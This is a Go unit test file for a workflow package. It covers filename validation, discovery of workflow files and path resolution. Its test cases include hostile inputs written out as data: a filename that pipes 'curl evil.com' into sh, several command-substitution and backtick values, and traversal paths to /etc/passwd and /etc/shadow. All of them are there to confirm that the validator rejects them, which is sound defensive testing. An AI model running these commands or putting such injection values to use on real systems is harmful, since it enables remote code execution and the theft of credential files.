package automate

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// IsValidFilename
// ---------------------------------------------------------------------------

func TestIsValidFilename(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// — valid —
		{"workflow.json", "workflow.json", true},
		{"my-workflow.json", "my-workflow.json", true},
		{"my_workflow.json", "my_workflow.json", true},
		{"workflow.v2.json", "workflow.v2.json", true},
		{"a.json", "a.json", true},
		{"MY_WORKFLOW.JSON", "MY_WORKFLOW.JSON", false}, // regex requires lowercase .json
		{"complex-name_v2.3.json", "complex-name_v2.3.json", true},

		// — invalid: shell injection —
		{"shell injection pipe", "legit; curl evil.com|sh.json", false},
		{"shell injection cmd subst", "$(cmd).json", false},
		{"shell injection backtick", "`cmd`.json", false},
		{"shell injection pipe char", "|cmd.json", false},
		{"shell injection andand", "&&cmd.json", false},
		{"shell injection oror", "||cmd.json", false},
		{"shell injection dollar", "$cmd.json", false},
		{"shell injection paren", "(cmd).json", false},

		// — invalid: path traversal —
		{"path traversal dotdot", "../../etc/passwd.json", false},
		{"path traversal leading dot", "../etc/passwd.json", false},

		// — invalid: wrong extension —
		{"txt extension", "workflow.txt", false},
		{"no extension", "workflow", false},
		{"space in name", "workflow txt", false},
		{"json in middle not suffix", "workflow.json.bak", false},

		// — invalid: edge cases —
		{"empty string", "", false},
		{"just extension", ".json", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsValidFilename(tt.input)
			if got != tt.expected {
				t.Errorf("IsValidFilename(%q) = %v, want %v", tt.input, got, tt.expected)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Dir
// ---------------------------------------------------------------------------

func TestDir(t *testing.T) {
	dir := Dir()
	if !strings.HasSuffix(dir, "/automate") && !strings.HasSuffix(dir, "\\automate") {
		t.Errorf("Dir() = %q, expected path ending in /automate", dir)
	}
}

// ---------------------------------------------------------------------------
// IsNotExists
// ---------------------------------------------------------------------------

func TestIsNotExists(t *testing.T) {
	t.Run("fs.ErrNotExist returns true", func(t *testing.T) {
		if !IsNotExists(fs.ErrNotExist) {
			t.Error("IsNotExists(fs.ErrNotExist) should be true")
		}
	})

	t.Run("wrapped fs.ErrNotExist returns true", func(t *testing.T) {
		wrapped := errors.Join(fs.ErrNotExist, errors.New("extra context"))
		if !IsNotExists(wrapped) {
			t.Error("IsNotExists(wrapped fs.ErrNotExist) should be true")
		}
	})

	t.Run("other error returns false", func(t *testing.T) {
		if IsNotExists(errors.New("some other error")) {
			t.Error("IsNotExists(other error) should be false")
		}
	})

	t.Run("nil returns false", func(t *testing.T) {
		if IsNotExists(nil) {
			t.Error("IsNotExists(nil) should be false")
		}
	})
}

// ---------------------------------------------------------------------------
// ExtractDescription
// ---------------------------------------------------------------------------

func TestExtractDescription(t *testing.T) {
	t.Run("valid workflow with description", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `{
			"description": "My workflow",
			"initial": {"message": "hello"}
		}`)

		desc, err := ExtractDescription(path)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if desc != "My workflow" {
			t.Errorf("ExtractDescription() = %q, want %q", desc, "My workflow")
		}
	})

	t.Run("valid workflow without description", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `{
			"initial": {"message": "hello"}
		}`)

		desc, err := ExtractDescription(path)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if desc != "" {
			t.Errorf("ExtractDescription() = %q, want empty string", desc)
		}
	})

	t.Run("valid workflow with steps instead of initial", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `{
			"description": "Steps-based workflow",
			"steps": [{"message": "step 1"}]
		}`)

		desc, err := ExtractDescription(path)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if desc != "Steps-based workflow" {
			t.Errorf("ExtractDescription() = %q, want %q", desc, "Steps-based workflow")
		}
	})

	t.Run("JSON without initial or steps", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `{"not_a_workflow": true}`)

		_, err := ExtractDescription(path)
		if err == nil {
			t.Fatal("expected error for non-workflow JSON")
		}
		if !strings.Contains(err.Error(), "not a workflow config") {
			t.Errorf("expected 'not a workflow config' error, got: %v", err)
		}
	})

	t.Run("non-JSON file", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `this is not json`)

		_, err := ExtractDescription(path)
		if err == nil {
			t.Fatal("expected error for non-JSON content")
		}
	})

	t.Run("non-existent file", func(t *testing.T) {
		_, err := ExtractDescription("/nonexistent/path/file.json")
		if err == nil {
			t.Fatal("expected error for non-existent file")
		}
	})
}

// ---------------------------------------------------------------------------
// Discover
// ---------------------------------------------------------------------------

func TestDiscover(t *testing.T) {
	t.Run("happy path with multiple valid workflows", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "workflow1.json"), `{
			"description": "First workflow",
			"initial": {"message": "hello"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "workflow2.json"), `{
			"description": "Second workflow",
			"steps": [{"message": "step"}]
		}`)
		mustWriteFile(t, filepath.Join(dir, "no_desc.json"), `{
			"initial": {"message": "no desc"}
		}`)

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 3 {
			t.Fatalf("expected 3 entries, got %d", len(entries))
		}

		// Check first workflow
		if entries[0].Filename != "no_desc.json" && entries[0].Filename != "workflow1.json" && entries[0].Filename != "workflow2.json" {
			t.Errorf("unexpected filename: %s", entries[0].Filename)
		}

		// Verify all have correct paths
		for _, e := range entries {
			if !strings.HasPrefix(e.FilePath, dir) {
				t.Errorf("FilePath %s should start with %s", e.FilePath, dir)
			}
		}
	})

	t.Run("empty directory returns empty slice", func(t *testing.T) {
		dir := t.TempDir()

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 0 {
			t.Errorf("expected 0 entries for empty dir, got %d", len(entries))
		}
	})

	t.Run("non-existent directory returns error", func(t *testing.T) {
		_, err := Discover("/nonexistent/path/that/does/not/exist")
		if err == nil {
			t.Fatal("expected error for non-existent directory")
		}
	})

	t.Run("skips non-JSON files", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"description": "Valid",
			"initial": {"message": "hello"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "readme.txt"), "This is a readme")
		mustWriteFile(t, filepath.Join(dir, "Makefile"), "all:\n\techo hello")

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry (only .json), got %d", len(entries))
		}
		if entries[0].Filename != "workflow.json" {
			t.Errorf("expected workflow.json, got %s", entries[0].Filename)
		}
	})

	t.Run("skips files with invalid names", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "good.json"), `{
			"description": "Good workflow",
			"initial": {"message": "hello"}
		}`)
		// Use filenames that are creatable on all OSes but fail the safety regex
		mustWriteFile(t, filepath.Join(dir, "$(whoami).json"), `{
			"description": "Injection",
			"initial": {"message": "injection"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "test & test.json"), `{
			"description": "Ampersand",
			"initial": {"message": "amp"}
		}`)

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry (safe names only), got %d", len(entries))
		}
		if entries[0].Filename != "good.json" {
			t.Errorf("expected good.json, got %s", entries[0].Filename)
		}
	})

	t.Run("skips invalid workflow JSON (missing initial and steps)", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "valid.json"), `{
			"description": "Valid",
			"initial": {"message": "hello"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "not_workflow.json"), `{
			"data": "not a workflow"
		}`)
		mustWriteFile(t, filepath.Join(dir, "corrupt.json"), `not valid json`)

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry, got %d", len(entries))
		}
		if entries[0].Filename != "valid.json" {
			t.Errorf("expected valid.json, got %s", entries[0].Filename)
		}
	})

	t.Run("skips subdirectories", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"description": "Valid",
			"initial": {"message": "hello"}
		}`)
		os.MkdirAll(filepath.Join(dir, "subdir"), 0755)
		mustWriteFile(t, filepath.Join(dir, "subdir", "nested.json"), `{
			"description": "Nested",
			"initial": {"message": "nested"}
		}`)

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry (no subdirs), got %d", len(entries))
		}
	})
}

// ---------------------------------------------------------------------------
// ResolvePath
// ---------------------------------------------------------------------------

func TestResolvePath(t *testing.T) {
	t.Run("exact match with .json extension", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "workflow.json")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if path != filepath.Join(dir, "workflow.json") {
			t.Errorf("ResolvePath() = %q, want %q", path, filepath.Join(dir, "workflow.json"))
		}
	})

	t.Run("name without .json extension appends .json", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "workflow")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if path != filepath.Join(dir, "workflow.json") {
			t.Errorf("ResolvePath() = %q, want %q", path, filepath.Join(dir, "workflow.json"))
		}
	})

	t.Run("case-insensitive .json extension", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "workflow.JSON")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		// On case-insensitive filesystems (macOS), os.Stat("workflow.JSON") resolves
		// to the actual file "workflow.json". On case-sensitive filesystems, the
		// .JSON suffix means it won't be treated as having .json and won't match.
		// Either way, the path should be under the test directory.
		if !strings.HasPrefix(path, dir) {
			t.Errorf("ResolvePath() = %q, expected path under %q", path, dir)
		}
	})

	t.Run("substring match returns single match", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "full_autonomous_workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "autonomous")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if path != filepath.Join(dir, "full_autonomous_workflow.json") {
			t.Errorf("ResolvePath() = %q, want %q", path, filepath.Join(dir, "full_autonomous_workflow.json"))
		}
	})

	t.Run("multiple substring matches returns error", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "autonomous_deploy.json"), `{
			"initial": {"message": "deploy"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "autonomous_test.json"), `{
			"initial": {"message": "test"}
		}`)

		_, err := ResolvePath(dir, "autonomous")
		if err == nil {
			t.Fatal("expected error for multiple matches")
		}
		if !strings.Contains(err.Error(), "multiple workflows match") {
			t.Errorf("expected 'multiple workflows match' error, got: %v", err)
		}
	})

	t.Run("no matches returns error", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		_, err := ResolvePath(dir, "nonexistent")
		if err == nil {
			t.Fatal("expected error for no matches")
		}
		if !strings.Contains(err.Error(), "no workflow matching") {
			t.Errorf("expected 'no workflow matching' error, got: %v", err)
		}
	})

	t.Run("path traversal with dotdot is blocked", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		_, err := ResolvePath(dir, "../../etc/passwd")
		if err == nil {
			t.Fatal("expected path traversal error")
		}
		if !strings.Contains(err.Error(), "workflow path escapes") {
			t.Errorf("expected 'workflow path escapes' error, got: %v", err)
		}
	})

	t.Run("path traversal with .json suffix is blocked", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		_, err := ResolvePath(dir, "../../etc/shadow.json")
		if err == nil {
			t.Fatal("expected path traversal error")
		}
		if !strings.Contains(err.Error(), "workflow path escapes") {
			t.Errorf("expected 'workflow path escapes' error, got: %v", err)
		}
	})

	t.Run("exact match takes precedence over substring", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "test.json"), `{
			"initial": {"message": "exact"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "my_test_workflow.json"), `{
			"initial": {"message": "substring"}
		}`)

		path, err := ResolvePath(dir, "test")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		// "test" without .json → tries "test.json" first → exact match wins
		if path != filepath.Join(dir, "test.json") {
			t.Errorf("ResolvePath() = %q, want %q", path, filepath.Join(dir, "test.json"))
		}
	})

	t.Run("non-existent directory returns error", func(t *testing.T) {
		_, err := ResolvePath("/nonexistent/path/that/does/not/exist", "workflow")
		if err == nil {
			t.Fatal("expected error for non-existent directory")
		}
	})

	t.Run("substring match is case-insensitive", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "My_Workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "my_workflow")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		// On case-insensitive filesystems (macOS), "my_workflow.json" resolves to
		// "My_Workflow.json" via os.Stat at the exact-match stage, so it's found
		// before the substring search. On case-sensitive filesystems, the substring
		// match catches it. Either way, it should resolve successfully under dir.
		if !strings.HasPrefix(path, dir) {
			t.Errorf("ResolvePath() = %q, expected path under %q", path, dir)
		}
	})
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func mustWriteFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write %s: %v", path, err)
	}
}
